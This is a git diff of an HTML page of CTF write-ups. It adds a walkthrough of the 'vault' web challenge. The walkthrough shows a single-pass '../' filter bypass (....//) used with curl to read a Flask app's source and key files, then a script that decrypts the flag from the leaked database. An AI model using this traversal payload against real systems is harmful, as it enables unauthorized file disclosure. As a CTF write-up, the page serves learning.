@@ -30,6 +30,7 @@
             <button onclick="show(this)">secure-shipments</button>
             <button onclick="show(this)">lost-in-the-snow</button>
             <button onclick="show(this)">long-christmas-generator</button>
+            <button onclick="show(this)">vault</button>
         </div>
 
         <div class="frick" id="keeper">
@@ -743,18 +744,179 @@ b' Admin notification: NYP{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}\n'
 
                 <br><br>
 
-                <img src="assets.png">
+                <img style="width: 100%" src="assets.png">
             </p>
 
             <p>
                 wow! that's the flag. i'm not showing you the image, if you want it, go download assetripper and try it out yourself :3
             </p>
         </div>
+        <div class="frick" id="vault">
+            <p class="header"><i>[web] - </i>vault</p>
 
+            <p>no one solved this during the ctf proper, and i only got it after asking for an initial nudge from the challenge author. however it was actually very solvable and i should have een able to do it during the ctf itself, and i'm sad i didn't try harder.</p>
+
+            <p>the website is a flask app vulnerable to LFI, but there are some rudimentary sanitization methods put in place to stop basic LFI attacks.</p>
+
+            <p>the way it prevents against LFI is it strips '../' from the name you pass into the download parameter. the trick here is that it only does it once, so you can craft a payload that would still result in a valid LFI payload after '../' is removed once from the payload. </p>
+
+            <p>such a payload would be the string ....//app.py - note that '../' occurs once in the string, and if you remove it, the outer parts of the string join together and it leaves behind only '../'; we can use this to get the Flask file's app.py, or maybe the Dockerfile.</p>
+
+            <p>
+                the reason i didnt figure any of this out during the ctf proper despite it being a very simple and common LFI trick is because youre not given any source code, so i felt like i was kind of blindly fumbling around. but regardless, its something i definitely shouldve tried.
+            </p>
+
+            <pre><code>
+┌──(ctfvenv)─(navi@jinxed)-[~/…/ctf/nyp/web/vault]
+└─$ curl -X GET https://vault.nypinfosec.net/download?file=....//app.py
+from flask import *
+from urllib.parse import unquote
+import os
+import logging
+from pathlib import Path
+...
+            </code></pre>
+            
+            <p>
+                anyways, that works. so let's read through all of app.py. ill cut the code snippets to the important parts.
+            </p>
+
+            <pre><code>
+@app.route("/download", methods=["GET"])
+def download():
+    if request.method == "GET":
+        file_path = request.args.get("file")
+        if file_path:
+            sanitized = unquote(file_path).replace("../", "")
+            sanitized_check = sanitized.lower()
+            if "flag" in sanitized_check:
+                return jsonify({"400": "Bad Request"})
+
+            try:
+                pth = Path(ROOT_DIR, "files", sanitized)
+                if not pth.is_file() or not pth.is_relative_to(ROOT_DIR):
+                    raise ValueError("Path traversal detected!")
+            except Exception as e:
+                print(e)
+                return jsonify({"404": "Not Found"})
+
+            return send_file(pth, as_attachment=True)
+        return jsonify({"400": f"Bad Request"})
+    return jsonify({"405": "Method Not Allowed"})
+            </code></pre>
+
+            <p>
+                there's the /download code. as you can see 'sanitized' only erases '../' once, as we suspected.
+            </p>
+
+            <pre><code>
+ROOT_DIR = os.path.abspath(os.path.dirname(__file__))
+LOG_FILE = os.path.join(ROOT_DIR, "instance/access.log")
+INIT_SCRIPT = os.path.join(ROOT_DIR, "initialize.py")                
+            </code></pre>
+
+            <p>
+                <i>initialize.py</i> seems like the next step. let's download that:
+            </p>
+
+            <pre><code>
+┌──(ctfvenv)─(navi@jinxed)-[~/…/ctf/nyp/web/vault]
+└─$ curl -X GET https://vault.nypinfosec.net/download?file=....//initialize.py
+import sqlite3
+import os
+
+FLAG = open("flag.txt", "r").read()
+
+data = [
+    {
+        "username": "admin",
+        "password": "ilovemario",
+    },
+    {
+        "username": "john",
+        "password": "depresso",
+    },
+    {
+        "username": "jane",
+        "password": "volcano1",
+    },
+    {
+        "username": "firefly",
+        "password": "scorchedearth",
+    },
+    {
+        "username": "solitude",
+        "password": FLAG,
+    }
+]
+key = os.urandom(16)
+
+def xor(data, key):
+    repeated_key = (key * (len(data) // len(key) + 1))[:len(data)]
+    xored_result = ''.join(chr(ord(d) ^ k) for d, k in zip(data, repeated_key))
+    return xored_result
+
+def initialize():
+    try:
+        os.remove("instance/vault.db")
+    except:
+        pass
+    conn = sqlite3.connect('instance/vault.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS vaults
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                 username TEXT NOT NULL,
+                 password TEXT NOT NULL,
+                 data BLOB)''')
+    conn.commit()
+
+    for user in data:
+        c.execute('SELECT * FROM vaults WHERE username=?', (user['username'],))
+        if c.fetchone() is None:
+            c.execute('INSERT INTO vaults (username, password) VALUES (?, ?)', (user['username'], xor(user["password"], key)))
+            conn.commit()
+
+    conn.close()
+    with open("instance/xor.key", "wb") as f:
+        f.write(key)
+
+if __name__ == "__main__":
+    initialize()
+            </code></pre>
+
+            <p>
+                perfect, there's mention of the flag. it's stored in an sqlite database, and XOR'd with a key. we just need to download the sqlite database, download the file storing the key, then select user solitude's password from the sqlite database and XOR it with our key. after downloading both relevant files with the same ../ trick, i wrote a quick little python script to get the flag:
+            </p>
+
+            <pre><code>
+┌──(ctfvenv)─(navi@jinxed)-[~/…/ctf/nyp/web/vault]
+└─$ cat vault_solver.py                                                       
+import sqlite3
+
+def xor(data, key):
+    repeated_key = (key * (len(data) // len(key) + 1))[:len(data)]
+    xored_result = ''.join(chr(ord(d) ^ k) for d, k in zip(data, repeated_key))
+    return xored_result
+
+conn = sqlite3.connect("vault.db")
+cur = conn.cursor()
+password = cur.execute("SELECT password FROM vaults WHERE username = 'solitude';")
+p = password.fetchone()[0]
+
+key = open('xor.key', 'rb').read()
+
+print(xor(p, key))
+                                                                                                            
+┌──(ctfvenv)─(navi@jinxed)-[~/…/ctf/nyp/web/vault]
+└─$ python vault_solver.py    
+NYP{7h1s_V4u1t_1$n7_V4ry_5eCu43}
+            </code></pre>
+        </div>
         <p id="sigma" style="display:none;"> <a href="#top">back to top</a> </p>
     </div>
 </body>
 <div id="stop">x</div>
+
 <script>
 
     hljs.highlightAll();
